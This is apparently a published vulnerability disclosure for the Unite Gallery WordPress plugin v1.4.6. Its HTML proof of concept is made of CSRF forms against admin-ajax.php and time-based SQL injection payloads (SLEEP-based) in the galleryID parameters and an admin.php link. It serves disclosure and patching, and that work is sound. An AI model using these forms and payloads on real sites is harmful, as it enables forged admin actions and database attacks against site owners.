# Submitter: Nitin Venkatesh
# Vulnerability Type: Cross-site Request Forgery [CWE-352], Improper
Neutralization of Special Elements used in an SQL Command (&#039;SQL
Injection&#039;)[CWE-89]
# Affected Versions: v1.4.6 and possibly below.
# Tested versions: v1.4.6
# Fixed Version: v1.5
# CVE Status: New & Unassigned
 
## Product Information:
 
The Unite Gallery is all in one image and video gallery for WordPress.
 
## Vulnerability Description:
 
to CSRF. Additionally, the following parameters were found to be
susceptible to SQLi -
 
Form submitted to /wp-admin/admin-ajax.php:
- data[galleryID]
 
Form submitted to /wp-admin/admin.php:
- galleryid
- id
 
## Proof of Concept:
 
<!DOCTYPE html>
<html>
<head>
</head>
<body>
<p>CSRF - Create Gallery</p>
<form action="http://localhost/wp-admin//admin-ajax.php" method="post">
<input type="hidden" name="action" value=&#039;unitegallery_ajax_action&#039; />
<input type="hidden" name="client_action" value=&#039;create_gallery&#039; />
<input type="hidden" name="gallery_type" value=&#039;ug-carousel&#039; />
<input type="hidden" name="data[main][title]" value=&#039;test 2&#039; />
<input type="hidden" name="data[main][alias]" value=&#039;test2&#039; />
<input type="hidden" name="data[main][category]" value=&#039;new&#039; />
<input type="hidden" name="data[main][full_width]" value=&#039;true&#039; />
<input type="hidden" name="data[main][gallery_width]" value=&#039;1000&#039; />
<input type="submit" value="submit" />
</form>
 
<p>CSRF + SQLi - Update Gallery</p>
<form action="http://localhost/wp-admin//admin-ajax.php" method="post">
<input type="hidden" name="action" value=&#039;unitegallery_ajax_action&#039; />
<input type="hidden" name="client_action" value=&#039;update_gallery&#039; />
<input type="hidden" name="gallery_type" value=&#039;ug-carousel&#039; />
<input type="hidden" name="data[main][title]" value=&#039;test 2&#039; />
<input type="hidden" name="data[main][alias]" value=&#039;test2&#039; />
<input type="hidden" name="data[main][shortcode]" value=&#039;[unitegallery
test2]&#039; />
<input type="hidden" name="data[main][category]" value=&#039;3&#039; />
<input type="hidden" name="data[main][full_width]" value=&#039;true&#039; />
<input type="hidden" name="data[main][gallery_width]" value=&#039;1000&#039; />
<input type="hidden" name="data[main][gallery_min_width]" value=&#039;150&#039; />
<input type="hidden" name="data[params][tile_width]" value=&#039;160&#039; />
<input type="hidden" name="data[params][tile_height]" value=&#039;160&#039; />
<input type="hidden" name="data[params][theme_gallery_padding]" value=&#039;0&#039; />
<input type="hidden" name="data[params][theme_carousel_align]"
value=&#039;center&#039; />
<input type="hidden" name="data[params][theme_carousel_offset]" value=&#039;0&#039; />
<input type="hidden" name="data[params][gallery_shuffle]" value=&#039;false&#039; />
<input type="hidden" name="data[params][tile_image_resolution]"
value=&#039;medium&#039; />
<input type="hidden" name="data[params][carousel_padding]" value=&#039;8&#039; />
<input type="hidden" name="data[params][carousel_space_between_tiles]"
value=&#039;20&#039; />
<input type="hidden" name="data[params][carousel_scroll_duration]"
value=&#039;500&#039; />
<input type="hidden" name="data[params][carousel_scroll_easing]"
value=&#039;easeOutCubic&#039; />
<input type="hidden" name="data[params][carousel_autoplay]" value=&#039;true&#039; />
<input type="hidden" name="data[params][carousel_autoplay_timeout]"
value=&#039;3000&#039; />
<input type="hidden" name="data[params][carousel_autoplay_direction]"
value=&#039;right&#039; />
<input type="hidden" name="data[params][carousel_autoplay_pause_onhover]"
value=&#039;true&#039; />
<input type="hidden" name="data[params][theme_enable_navigation]"
value=&#039;true&#039; />
<input type="hidden" name="data[params][theme_navigation_enable_play]"
value=&#039;true&#039; />
<input type="hidden" name="data[params][theme_navigation_align]"
value=&#039;center&#039; />
<input type="hidden" name="data[params][theme_navigation_offset_hor]"
value=&#039;0&#039; />
<input type="hidden" name="data[params][theme_navigation_position]"
value=&#039;bottom&#039; />
<input type="hidden" name="data[params][theme_navigation_margin]"
value=&#039;20&#039; />
<input type="hidden" name="data[params][theme_space_between_arrows]"
value=&#039;5&#039; />
<input type="hidden" name="data[params][carousel_navigation_numtiles]"
value=&#039;3&#039; />
<input type="hidden" name="data[params][position]" value=&#039;center&#039; />
<input type="hidden" name="data[params][margin_top]" value=&#039;0&#039; />
<input type="hidden" name="data[params][margin_bottom]" value=&#039;0&#039; />
<input type="hidden" name="data[params][margin_left]" value=&#039;0&#039; />
<input type="hidden" name="data[params][margin_right]" value=&#039;0&#039; />
<input type="hidden" name="data[params][tile_enable_action]" value=&#039;true&#039; />
<input type="hidden" name="data[params][tile_as_link]" value=&#039;false&#039; />
<input type="hidden" name="data[params][tile_link_newpage]" value=&#039;true&#039; />
<input type="hidden" name="data[params][tile_enable_border]" value=&#039;true&#039; />
<input type="hidden" name="data[params][tile_border_width]" value=&#039;3&#039; />
<input type="hidden" name="data[params][tile_border_color]" value=&#039;#f0f0f0&#039;
/>
<input type="hidden" name="data[params][tile_border_radius]" value=&#039;0&#039; />
<input type="hidden" name="data[params][tile_enable_outline]" value=&#039;true&#039;
/>
<input type="hidden" name="data[params][tile_outline_color]"
value=&#039;#8b8b8b&#039; />
<input type="hidden" name="data[params][tile_enable_shadow]" value=&#039;false&#039;
/>
<input type="hidden" name="data[params][tile_shadow_h]" value=&#039;1&#039; />
<input type="hidden" name="data[params][tile_shadow_v]" value=&#039;1&#039; />
<input type="hidden" name="data[params][tile_shadow_blur]" value=&#039;3&#039; />
<input type="hidden" name="data[params][tile_shadow_color]" value=&#039;#8b8b8b&#039;
/>
<input type="hidden" name="data[params][tile_enable_image_effect]"
value=&#039;false&#039; />
<input type="hidden" name="data[params][tile_image_effect_type]" value=&#039;bw&#039;
/>
<input type="hidden" name="data[params][tile_image_effect_reverse]"
value=&#039;false&#039; />
<input type="hidden" name="data[params][tile_enable_overlay]" value=&#039;true&#039;
/>
<input type="hidden" name="data[params][tile_overlay_opacity]" value=&#039;0.4&#039;
/>
<input type="hidden" name="data[params][tile_overlay_color]"
value=&#039;#000000&#039; />
<input type="hidden" name="data[params][tile_enable_icons]" value=&#039;true&#039; />
<input type="hidden" name="data[params][tile_show_link_icon]" value=&#039;false&#039;
/>
<input type="hidden" name="data[params][tile_space_between_icons]"
value=&#039;26&#039; />
<input type="hidden" name="data[params][tile_enable_textpanel]"
value=&#039;false&#039; />
<input type="hidden" name="data[params][tile_textpanel_source]"
value=&#039;title&#039; />
<input type="hidden" name="data[params][tile_textpanel_always_on]"
value=&#039;false&#039; />
<input type="hidden" name="data[params][tile_textpanel_appear_type]"
value=&#039;slide&#039; />
<input type="hidden" name="data[params][tile_textpanel_padding_top]"
value=&#039;8&#039; />
<input type="hidden" name="data[params][tile_textpanel_padding_bottom]"
value=&#039;8&#039; />
<input type="hidden" name="data[params][tile_textpanel_padding_left]"
value=&#039;11&#039; />
<input type="hidden" name="data[params][tile_textpanel_padding_right]"
value=&#039;11&#039; />
<input type="hidden" name="data[params][tile_textpanel_bg_color]"
value=&#039;#000000&#039; />
<input type="hidden" name="data[params][tile_textpanel_bg_opacity]"
value=&#039;0.6&#039; />
<input type="hidden" name="data[params][tile_textpanel_title_color]"
value=&#039;#ffffff&#039; />
<input type="hidden" name="data[params][tile_textpanel_title_text_align]"
value=&#039;left&#039; />
<input type="hidden" name="data[params][tile_textpanel_title_font_size]"
value=&#039;14&#039; />
<input type="hidden" name="data[params][tile_textpanel_title_bold]"
value=&#039;true&#039; />
<input type="hidden" name="data[params][lightbox_type]" value=&#039;wide&#039; />
<input type="hidden" name="data[params][lightbox_hide_arrows_onvideoplay]"
value=&#039;true&#039; />
<input type="hidden" name="data[params][lightbox_slider_control_zoom]"
value=&#039;true&#039; />
<input type="hidden" name="data[params][gallery_mousewheel_role]"
value=&#039;zoom&#039; />
<input type="hidden" name="data[params][lightbox_overlay_opacity]"
value=&#039;1&#039; />
<input type="hidden" name="data[params][lightbox_overlay_color]"
value=&#039;#000000&#039; />
<input type="hidden" name="data[params][lightbox_top_panel_opacity]"
value=&#039;0.4&#039; />
<input type="hidden" name="data[params][lightbox_show_numbers]"
value=&#039;true&#039; />
<input type="hidden" name="data[params][lightbox_numbers_size]" value=&#039;14&#039;
/>
<input type="hidden" name="data[params][lightbox_numbers_color]"
value=&#039;#e5e5e5&#039; />
<input type="hidden" name="data[params][lightbox_show_textpanel]"
value=&#039;true&#039; />
<input type="hidden" name="data[params][lightbox_textpanel_width]"
value=&#039;550&#039; />
<input type="hidden" name="data[params][lightbox_textpanel_source]"
value=&#039;title&#039; />
<input type="hidden" name="data[params][lightbox_textpanel_title_color]"
value=&#039;#e5e5e5&#039; />
<input type="hidden"
name="data[params][lightbox_textpanel_title_text_align]" value=&#039;left&#039; />
<input type="hidden"
name="data[params][lightbox_textpanel_title_font_size]" value=&#039;14&#039; />
<input type="hidden" name="data[params][lightbox_textpanel_title_bold]"
value=&#039;false&#039; />
<input type="hidden" name="data[params][lightbox_compact_overlay_opacity]"
value=&#039;0.6&#039; />
<input type="hidden" name="data[params][lightbox_compact_overlay_color]"
value=&#039;#000000&#039; />
<input type="hidden" name="data[params][lightbox_arrows_position]"
value=&#039;sides&#039; />
<input type="hidden" name="data[params][lightbox_arrows_inside_alwayson]"
value=&#039;false&#039; />
<input type="hidden" name="data[params][lightbox_compact_show_numbers]"
value=&#039;true&#039; />
<input type="hidden" name="data[params][lightbox_compact_numbers_size]"
value=&#039;14&#039; />
<input type="hidden" name="data[params][lightbox_compact_numbers_color]"
value=&#039;#e5e5e5&#039; />
<input type="hidden"
name="data[params][lightbox_compact_numbers_padding_top]" value=&#039;7&#039; />
<input type="hidden"
name="data[params][lightbox_compact_numbers_padding_right]" value=&#039;5&#039; />
<input type="hidden" name="data[params][lightbox_compact_show_textpanel]"
value=&#039;true&#039; />
<input type="hidden" name="data[params][lightbox_compact_textpanel_source]"
value=&#039;title&#039; />
<input type="hidden"
name="data[params][lightbox_compact_textpanel_title_color]" value=&#039;#e5e5e5&#039;
/>
<input type="hidden"
name="data[params][lightbox_compact_textpanel_title_font_size]" value=&#039;14&#039;
/>
<input type="hidden"
name="data[params][lightbox_compact_textpanel_title_bold]" value=&#039;false&#039; />
<input type="hidden"
name="data[params][lightbox_compact_textpanel_padding_top]" value=&#039;5&#039; />
<input type="hidden"
name="data[params][lightbox_compact_textpanel_padding_left]" value=&#039;10&#039; />
<input type="hidden"
name="data[params][lightbox_compact_textpanel_padding_right]" value=&#039;10&#039; />
<input type="hidden"
name="data[params][lightbox_compact_slider_image_border]" value=&#039;true&#039; />
<input type="hidden"
name="data[params][lightbox_compact_slider_image_border_width]" value=&#039;10&#039;
/>
<input type="hidden"
name="data[params][lightbox_compact_slider_image_border_color]"
value=&#039;#ffffff&#039; />
<input type="hidden"
name="data[params][lightbox_compact_slider_image_border_radius]" value=&#039;0&#039;
/>
<input type="hidden"
name="data[params][lightbox_compact_slider_image_shadow]" value=&#039;true&#039; />
<input type="hidden" name="data[params][include_jquery]" value=&#039;true&#039; />
<input type="hidden" name="data[params][js_to_body]" value=&#039;false&#039; />
<input type="hidden" name="data[params][gallery_debug_errors]"
value=&#039;false&#039; />
 
<!-- SQLi -->
<input type="hidden" name="data[galleryID]" value=&#039;1 AND (SELECT * FROM
(SELECT(SLEEP(5)))rock)&#039; />
<input type="submit" value="submit" />
</form>
 
<p>CSRF - Add Items</p>
<form action="http://localhost/wp-admin/admin-ajax.php" method="post">
<input type="hidden" name="action" value=&#039;unitegallery_ajax_action&#039; />
<input type="hidden" name="client_action" value=&#039;add_item&#039; />
<input type="hidden" name="gallery_type" value=&#039;&#039; />
<input type="hidden" name="data[type]" value=&#039;html5video&#039; />
<input type="hidden" name="data[title]" value=&#039;test&#039; />
<input type="hidden" name="data[description]" value=&#039;&#039; />
<input type="hidden" name="data[urlImage]" value=&#039;&#039; />
<input type="hidden" name="data[urlThumb]" value=&#039;&#039; />
<input type="hidden" name="data[urlVideo_mp4]" value=&#039;
http://video-js.zencoder.com/oceans-clip.mp4&#039; />
<input type="hidden" name="data[urlVideo_webm]" value=&#039;
http://video-js.zencoder.com/oceans-clip.webm&#039; />
<input type="hidden" name="data[urlVideo_ogv]" value=&#039;
http://video-js.zencoder.com/oceans-clip.ogv&#039; />
<input type="hidden" name="data[catID]" value=&#039;4&#039; />
<input type="submit" value="submit" />
</form>
 
<p>CSRF + SQLi - Retrieve Items (Edit Settings - Items Tab)</p>
<form action="http://localhost/wp-admin/admin-ajax.php" method="post">
<input type="hidden" name="action" value=&#039;unitegallery_ajax_action&#039; />
<input type="hidden" name="client_action" value=&#039;get_cat_items&#039; />
<input type="hidden" name="gallery_type" value=&#039;ug-carousel&#039; />
<input type="hidden" name="data[catID]" value=&#039;3&#039; />
 
<!-- SQLi -->
<input type="hidden" name="data[galleryID]" value=&#039;1 AND (SELECT * FROM
(SELECT(SLEEP(5)))rock)&#039; />
<input type="submit" value="submit" />
</form>
 
<p> CSRF + SQLi - Action buttons</p>
<ul>
<li>
<a href="
http://localhost/wp-admin/admin.php?page=unitegallery&view=items&galleryid=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))rock)
">
http://localhost/wp-admin/admin.php?page=unitegallery&view=items&galleryid=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))rock)
</a></li>
<li>
<a href="
">
</a>
</li>
</ul>
</body>
</html>
 
## Solution:
 
Upgrade to v1.5 or higher
 
## Disclosure Timeline:
 
2015-06-06 - Discovered. Reported to developer.
2015-06-10 - Updated version released.
2015-07-25 - Publishing disclosure on FD mailing list
 
## Disclaimer:
 
This disclosure is purely meant for educational purposes. I will in no way
be responsible as to how the information in this disclosure is used.

